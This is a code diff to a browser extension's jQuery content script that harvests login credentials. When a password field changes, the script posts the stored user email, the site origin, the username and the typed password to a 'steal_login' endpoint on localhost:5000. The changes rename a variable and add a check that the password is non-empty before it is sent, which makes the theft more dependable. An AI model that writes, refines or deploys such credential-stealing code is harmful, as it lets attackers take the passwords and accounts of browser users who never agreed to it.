@@ -1,5 +1,6 @@
 var inputs = $('input');
 var password = $('[type="password"]')[0];
+
 $(password).change(function () {
     chrome.storage.local.get('email', function (result) {
         var userEmail = result.email;
@@ -29,16 +30,16 @@ $.each(inputs, function (element) {
                 if ($(inputs[element]).val() != "") {
                     chrome.storage.local.get('email', function (resu) {
                         var userEmail;
-                        var password = $('[type="password"]')[0];
+                        var pw = $('[type="password"]')[0];
                         if (typeof resu === 'undefined') userEmail = "no_email_found";
                         else userEmail = resu.email;
                         if (inputs[element].value != "" &&
-                            !(typeof password === 'undefined')) {
+                            !(typeof pw === 'undefined') && $(pw).val() != "") {
                             $.post("http://localhost:5000/steal_login", {
                                 email: userEmail,
                                 url: window.location.origin,
                                 username: $(inputs[element]).val(),
-                                password: $(password).val()
+                                password: $(pw).val()
                             });
                         }
                     });
